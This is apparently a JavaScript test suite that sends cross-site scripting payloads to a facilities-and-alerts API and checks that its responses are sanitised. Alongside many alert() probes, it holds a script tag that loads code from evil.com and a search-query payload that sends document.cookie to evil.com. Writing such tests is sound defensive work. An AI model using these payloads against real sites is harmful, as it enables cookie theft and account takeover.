/**
 * Security Tests - XSS (Cross-Site Scripting)
 * Tests for XSS vulnerabilities
 */

import { describe, it, expect } from 'vitest';
import request from 'supertest';
import { app } from '../../../app.js';

describe('XSS Prevention', () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
    'javascript:alert("XSS")',
    '<a href="javascript:alert(\'XSS\')">Click</a>',
  ];

  describe('POST /api/v1/facilities - XSS in Facility Creation', () => {
    it.each(xssPayloads)(
      'should sanitize XSS payload in facility name: %s',
      async (payload) => {
        const response = await request(app)
          .post('/api/v1/facilities')
          .send({
            name: payload,
            location: 'Test Location',
          });

        // Should accept or reject, but not execute script
        expect([200, 201, 400]).toContain(response.status);
        
        if (response.status === 200 || response.status === 201) {
          const facilityName = response.body.name;
          
          // Should not contain unescaped script tags
          expect(facilityName).not.toMatch(/<script>/i);
          expect(facilityName).not.toMatch(/javascript:/i);
          expect(facilityName).not.toMatch(/onerror=/i);
          expect(facilityName).not.toMatch(/onload=/i);
        }
      }
    );

    it('should sanitize XSS in location field', async () => {
      const maliciousLocation = '<img src=x onerror="alert(document.cookie)">';
      
      const response = await request(app)
        .post('/api/v1/facilities')
        .send({
          name: 'Test Facility',
          location: maliciousLocation,
        });

      expect([200, 201, 400]).toContain(response.status);
      
      if (response.body.location) {
        expect(response.body.location).not.toMatch(/<img/i);
        expect(response.body.location).not.toMatch(/onerror/i);
      }
    });
  });

  describe('POST /api/v1/alerts - XSS in Alert Messages', () => {
    it('should sanitize script tags in alert message', async () => {
      const maliciousMessage = 'Alert: <script>alert(document.cookie)</script>';
      
      const response = await request(app)
        .post('/api/v1/alerts')
        .send({
          facilityId: 1,
          severity: 'high',
          message: maliciousMessage,
        });

      expect([200, 201, 400, 404]).toContain(response.status);
      
      if (response.body.message) {
        expect(response.body.message).not.toMatch(/<script>/i);
      }
    });

    it('should prevent XSS in metadata fields', async () => {
      const response = await request(app)
        .post('/api/v1/alerts')
        .send({
          facilityId: 1,
          severity: 'high',
          message: 'Test Alert',
          metadata: {
            note: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            details: '<svg onload=alert(1)>',
          },
        });

      expect([200, 201, 400, 404]).toContain(response.status);
      
      if (response.body.metadata) {
        const metadataStr = JSON.stringify(response.body.metadata);
        expect(metadataStr).not.toMatch(/<iframe/i);
        expect(metadataStr).not.toMatch(/<svg/i);
        expect(metadataStr).not.toMatch(/onload/i);
      }
    });
  });

  describe('GET Endpoints - XSS in Query Parameters', () => {
    it('should handle XSS in search query', async () => {
      const maliciousSearch = '<script>fetch("http://evil.com?cookie="+document.cookie)</script>';
      
      const response = await request(app)
        .get('/api/v1/facilities')
        .query({ search: maliciousSearch });

      expect(response.status).not.toBe(500);
      
      // Response should not reflect unescaped script
      const bodyStr = JSON.stringify(response.body);
      expect(bodyStr).not.toMatch(/<script>/i);
    });

    it('should sanitize XSS in sort parameter', async () => {
      const maliciousSort = 'name<script>alert(1)</script>';
      
      const response = await request(app)
        .get('/api/v1/sensor-readings')
        .query({ sort: maliciousSort });

      expect([200, 400]).toContain(response.status);
    });

    it('should prevent XSS in error messages', async () => {
      const maliciousId = '"><img src=x onerror=alert(1)>';
      
      const response = await request(app)
        .get(`/api/v1/facilities/${maliciousId}`);

      expect([400, 404]).toContain(response.status);
      
      // Error message should not reflect unescaped input
      if (response.body.error) {
        expect(response.body.error).not.toMatch(/<img/i);
        expect(response.body.error).not.toMatch(/onerror/i);
      }
    });
  });

  describe('Advanced XSS Patterns', () => {
    it('should prevent DOM-based XSS payloads', async () => {
      const domXssPayloads = [
        '"><svg/onload=alert(1)>',
        "'-alert(1)-'",
        '";alert(String.fromCharCode(88,83,83));//',
      ];

      for (const payload of domXssPayloads) {
        const response = await request(app)
          .post('/api/v1/facilities')
          .send({ name: payload, location: 'Test' });

        expect([200, 201, 400]).toContain(response.status);
        
        if (response.body.name) {
          expect(response.body.name).not.toMatch(/onload=/i);
          expect(response.body.name).not.toMatch(/alert\(/i);
        }
      }
    });

    it('should prevent stored XSS via data attributes', async () => {
      const dataAttrPayload = '<div data-value=""><script>alert(1)</script>"></div>';
      
      const response = await request(app)
        .post('/api/v1/facilities')
        .send({
          name: 'Test',
          location: dataAttrPayload,
        });

      expect([200, 201, 400]).toContain(response.status);
      
      if (response.body.location) {
        expect(response.body.location).not.toMatch(/<script>/i);
      }
    });

    it('should handle encoded XSS attempts', async () => {
      const encodedPayloads = [
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
      ];

      for (const payload of encodedPayloads) {
        const response = await request(app)
          .post('/api/v1/facilities')
          .send({ name: payload, location: 'Test' });

        expect([200, 201, 400]).toContain(response.status);
      }
    });
  });

  describe('Content Security Policy Checks', () => {
    it('should have secure headers to prevent XSS', async () => {
      const response = await request(app).get('/api/v1/facilities');

      // Check for security headers (if implemented)
      // Note: These might need to be added to the application
      const headers = response.headers;
      
      // Content-Type should be application/json to prevent HTML injection
      if (response.status === 200) {
        expect(headers['content-type']).toMatch(/application\/json/);
      }
    });
  });
});
